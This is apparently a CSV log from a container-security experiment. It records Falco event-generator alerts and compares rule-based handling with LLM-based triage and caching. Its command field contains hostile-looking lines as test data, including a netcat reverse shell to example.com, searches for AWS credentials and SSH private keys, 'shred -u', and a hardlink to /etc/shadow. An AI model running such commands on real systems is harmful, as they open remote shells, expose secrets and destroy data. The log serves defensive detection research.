timestamp,event_type,rule_name,priority,prompt_tokens,completion_tokens,latency_ms,remediation_status,remediation_action,mitre_technique,target_container,attack_source,attack_label,attack_id,container_id,container_image,event_source,experiment_mode,ground_truth,rule_matched,llm_called,cache_hit,cache_key,gate_decision,llm_action,llm_threat_level,cache_ttl
2026-05-17T11:17:11.545047,ignored,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:13.128946,ignored,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:14.715281,ignored,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-831757150,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:16.315647,ignored,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-OqeliP.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:17.902500,ignored,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-OqeliP.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:19.492054,ignored,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:21.071961,ignored,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1922615288/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:22.669394,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:24.256250,ignored,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:25.840299,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:27.432188,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:29.016578,ignored,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:30.605238,ignored,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1953500039/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:32.187635,ignored,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:33.770547,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:35.396074,ignored,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:36.983947,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:38.565045,ignored,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:40.145998,ignored,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:41.740785,ignored,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:43.328481,ignored,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:44.911814,ignored,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:46.502195,ignored,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-4087899463,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:48.084225,ignored,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-22fTbv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:49.675962,ignored,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-22fTbv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:51.277859,ignored,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:52.862104,ignored,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1937500118/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:54.448295,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:56.035941,ignored,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:17:57.620955,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:17:59.210090,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:18:00.794015,ignored,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:02.376219,ignored,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-3885503366/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:03.956586,ignored,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:05.541152,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:18:07.131907,ignored,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:08.718369,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:18:10.301917,ignored,PTRACE anti-debug attempt,Notice,0,0,0,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:11.883960,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,1,0,0,,rule,,,
2026-05-17T11:18:13.470502,ignored,Search Private Keys or Passwords,Warning,0,0,0,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:15.060525,ignored,Directory traversal monitored file read,Warning,0,0,0,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:16.643062,ignored,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:18.223961,ignored,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:19.805832,ignored,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:21.403256,ignored,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3677611856,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:22.997352,ignored,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-WyYBXH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:24.583639,ignored,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-WyYBXH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:18:26.175053,ignored,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,baseline_b,true,0,0,0,,ignored,,,
2026-05-17T11:45:15.138703,llm-analyzed,Read sensitive file trusted after startup,Warning,381,58,8911,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b7d41082564995db77d6b74b75a4f3d2,llm,alert,medium,3600
2026-05-17T11:45:25.719567,llm-analyzed,Disallowed SSH Connection Non Standard Port,Notice,383,68,8999,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,629494c6c6d948ac631c427d8d609862,llm,pause,medium,3600
2026-05-17T11:45:35.240076,llm-analyzed,Find AWS Credentials,Warning,367,49,7939,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,b95c830e335267463f9a43857f2ed885,llm,alert,high,3600
2026-05-17T11:45:45.149296,llm-analyzed,Remove Bulk Data from Disk,Warning,385,52,8327,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-1257058840,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6c972ecf189eefa9be9e4d28f665b944,llm,alert,medium,3600
2026-05-17T11:45:57.040720,llm-analyzed,Execution from /dev/shm,Warning,408,84,10308,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-wSJ2IH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,4e4f7083604fc1fe55707f472ebe6270,llm,alert,high,3600
2026-05-17T11:45:58.621105,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-wSJ2IH.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:46:08.043797,llm-analyzed,Clear Log Activities,Warning,342,55,7842,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,357658d27e05316e491368365302d386,llm,alert,medium,3600
2026-05-17T11:46:18.596264,llm-analyzed,Create Symlink Over Sensitive Files,Warning,408,58,8971,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-87276934/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,aa21b1177c801979bea62a239e056977,llm,alert,high,3600
2026-05-17T11:46:29.295410,llm-analyzed,Directory traversal monitored file read,Warning,350,81,9117,ignored,,,,manual,Directory traversal monitored file read,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,6b25374d77be2bccc3489c6473bdb223,llm,alert,medium,3600
2026-05-17T11:46:30.877584,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,medium,3600
2026-05-17T11:46:32.461043,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,pause,medium,3600
2026-05-17T11:46:34.050912,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,high,3600
2026-05-17T11:46:35.633402,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-28908837,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,3600
2026-05-17T11:46:37.213995,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-t4aVVv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:46:38.793278,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-t4aVVv.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:46:40.372628,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,3600
2026-05-17T11:46:41.950782,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-3474911395/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,alert,high,3600
2026-05-17T11:46:43.536495,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:46:53.611752,llm-analyzed,Packet socket created in container,Notice,363,62,8495,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,50444a11263ba4bdc942b447dce33e70,llm,pause,medium,3600
2026-05-17T11:46:55.206402,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:46:56.797762,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:47:06.971432,llm-analyzed,Fileless execution via memfd_create,Critical,376,59,8593,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ed1d903fc003a9a58bc1a53dc4c8ee7d,llm,alert,high,3600
2026-05-17T11:47:17.969117,llm-analyzed,Create Hardlink Over Sensitive Files,Warning,421,64,9418,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1954026859/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,ce29cc75814d17294a676363d10f7622,llm,alert,high,3600
2026-05-17T11:47:26.630337,llm-analyzed,System user interactive,Informational,314,52,7080,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,256d745947e9b7d7eae333d0ebd169e3,llm,alert,high,3600
2026-05-17T11:47:28.209131,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:47:37.910457,llm-analyzed,PTRACE anti-debug attempt,Notice,331,68,8121,ignored,,,,manual,PTRACE anti-debug attempt,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,1e39dfc23dcf83ae7a47a9666599847c,llm,alert,high,3600
2026-05-17T11:47:39.495549,rule-matched,PTRACE attached to process,Warning,0,0,0,skipped,,T1068,falco-event-generator,manual,PTRACE attached to process,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:47:50.079233,llm-analyzed,Search Private Keys or Passwords,Warning,342,80,9004,ignored,,,,manual,Search Private Keys or Passwords,find /tmp -maxdepth 1 -iname id_rsa,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,1,0,3a08e749a190242c74492afdfc1de468,llm,alert,medium,3600
2026-05-17T11:47:51.659527,cache-hit,Read sensitive file trusted after startup,Warning,0,0,0,ignored,,,,manual,Read sensitive file trusted after startup,httpd --loglevel info run ^syscall.ReadSensitiveFileUntrusted$ --sleep 6s,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b7d41082564995db77d6b74b75a4f3d2,cache-hit,alert,medium,3600
2026-05-17T11:47:53.239181,cache-hit,Disallowed SSH Connection Non Standard Port,Notice,0,0,0,ignored,,,,manual,Disallowed SSH Connection Non Standard Port,ssh user@example.com -p 443,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,629494c6c6d948ac631c427d8d609862,cache-hit,pause,medium,3600
2026-05-17T11:47:54.831043,cache-hit,Find AWS Credentials,Warning,0,0,0,ignored,,,,manual,Find AWS Credentials,find /tmp -maxdepth 1 -iname .aws/credentials,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,b95c830e335267463f9a43857f2ed885,cache-hit,alert,high,3600
2026-05-17T11:47:56.416009,cache-hit,Remove Bulk Data from Disk,Warning,0,0,0,ignored,,,,manual,Remove Bulk Data from Disk,shred -u /tmp/falco-event-generator-syscall-RemoveBulkDataFromDisk-3864659558,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,6c972ecf189eefa9be9e4d28f665b944,cache-hit,alert,medium,3600
2026-05-17T11:47:57.994557,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-xs2H2j.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:47:59.572979,cache-hit,Execution from /dev/shm,Warning,0,0,0,ignored,,,,manual,Execution from /dev/shm,sh -c /dev/shm/falco-event-generator-syscall-ExecutionFromDevShm-xs2H2j.sh,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,4e4f7083604fc1fe55707f472ebe6270,cache-hit,alert,high,3600
2026-05-17T11:48:01.156827,cache-hit,Clear Log Activities,Warning,0,0,0,ignored,,,,manual,Clear Log Activities,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,357658d27e05316e491368365302d386,cache-hit,alert,medium,3600
2026-05-17T11:48:02.737833,cache-hit,Create Symlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Symlink Over Sensitive Files,ln -s /etc /tmp/falco-event-generator-syscall-CreateSymlinkOverSensitiveFiles-1807769247/etc_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,aa21b1177c801979bea62a239e056977,cache-hit,alert,high,3600
2026-05-17T11:48:04.317033,rule-matched,Netcat Remote Code Execution in Container,Warning,0,0,0,skipped,,T1059,falco-event-generator,manual,Netcat Remote Code Execution in Container,nc -e /bin/sh example.com 22,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:05.896095,cache-hit,Packet socket created in container,Notice,0,0,0,ignored,,,,manual,Packet socket created in container,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,50444a11263ba4bdc942b447dce33e70,cache-hit,pause,medium,3600
2026-05-17T11:48:07.479759,rule-matched,Read sensitive file untrusted,Warning,0,0,0,skipped,,T1083,falco-event-generator,manual,Read sensitive file untrusted,event-generator run syscall --loop,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:09.071005,rule-matched,Run shell untrusted,Notice,0,0,0,skipped,,T1059,falco-event-generator,manual,Run shell untrusted,sh -c ls > /dev/null,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
2026-05-17T11:48:10.651540,cache-hit,Fileless execution via memfd_create,Critical,0,0,0,ignored,,,,manual,Fileless execution via memfd_create,4 run helper.DoNothing,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ed1d903fc003a9a58bc1a53dc4c8ee7d,cache-hit,alert,high,3600
2026-05-17T11:48:12.229469,cache-hit,Create Hardlink Over Sensitive Files,Warning,0,0,0,ignored,,,,manual,Create Hardlink Over Sensitive Files,ln -v /etc/shadow /tmp/falco-event-generator-syscall-CreateHardlinkOverSensitiveFiles-1864564634/shadow_link,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,ce29cc75814d17294a676363d10f7622,cache-hit,alert,high,3600
2026-05-17T11:48:13.810645,cache-hit,System user interactive,Informational,0,0,0,ignored,,,,manual,System user interactive,login,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,0,0,1,256d745947e9b7d7eae333d0ebd169e3,cache-hit,alert,high,3600
2026-05-17T11:48:15.389183,rule-matched,Drop and execute new binary in container,Critical,0,0,0,skipped,,T1485,falco-event-generator,manual,Drop and execute new binary in container,falco-event-gen,d15950a38059,falcosecurity/event-generator/latest,syscall,proposed,true,1,0,0,,rule,,,3600
